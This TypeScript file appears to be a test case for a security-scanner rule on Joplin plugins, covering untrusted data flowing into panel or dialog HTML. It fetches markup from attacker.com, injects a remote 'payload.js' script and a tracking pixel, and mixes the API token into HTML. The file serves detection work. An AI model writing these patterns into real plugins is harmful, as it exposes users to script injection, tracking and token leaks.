// FROM : 
// fetch() / axios.get() / process.env.UI_URL / joplin.settings.globalValue('someUrlSetting') / joplin.settings.value('anotherUrlSetting') / joplin.data.get() / joplin.settings.globalValue('api.token') / html iframe string literal / html script string literal / html img tracker string literal
// 
// TO : 
// joplin.views.panels.setHtml / joplin.views.dialogs.setHtml

import * as joplin from 'api';
import fetch from 'node-fetch';
import axios from 'axios';

async function triggerRule() {
    const panel = await joplin.views.panels.create('panel_r11');
    const dialog = await joplin.views.dialogs.create('dialog_r11');

    const s1 = await fetch('http://attacker.com/ui');
    const s1Text = await s1.text();
    await joplin.views.panels.setHtml(panel, s1Text);
    await joplin.views.dialogs.setHtml(dialog, s1Text);

    const s2 = await axios.get('http://attacker.com/ui2');
    const s2Data = s2.data;
    await joplin.views.panels.setHtml(panel, s2Data);
    await joplin.views.dialogs.setHtml(dialog, s2Data);

    const s3 = process.env.UI_URL;
    await joplin.views.panels.setHtml(panel, s3);
    await joplin.views.dialogs.setHtml(dialog, s3);

    const s4 = await joplin.settings.globalValue('someUrlSetting');
    await joplin.views.panels.setHtml(panel, s4);
    await joplin.views.dialogs.setHtml(dialog, s4);

    const s5 = await joplin.settings.value('anotherUrlSetting');
    await joplin.views.panels.setHtml(panel, s5);
    await joplin.views.dialogs.setHtml(dialog, s5);

    const s6 = await joplin.data.get(['notes', '1']);
    const s6Val = '<img src="icon.png">' + s6.title;
    await joplin.views.panels.setHtml(panel, s6Val);
    await joplin.views.dialogs.setHtml(dialog, s6Val);

    const s7 = await joplin.settings.globalValue('api.token');
    const s7Val = '<script src="local.js"></script>' + s7;
    await joplin.views.panels.setHtml(panel, s7Val);
    await joplin.views.dialogs.setHtml(dialog, s7Val);

    const s8 = '<iframe src="https://example.com/remote"></iframe>';
    await joplin.views.panels.setHtml(panel, s8);
    await joplin.views.dialogs.setHtml(dialog, s8);

    const s9 = '<script src="https://example.com/payload.js"></script>';
    await joplin.views.panels.setHtml(panel, s9);
    await joplin.views.dialogs.setHtml(dialog, s9);

    const s10 = '<img src="https://attacker.com/track.gif">';
    await joplin.views.panels.setHtml(panel, s10);
    await joplin.views.dialogs.setHtml(dialog, s10);
}

export { };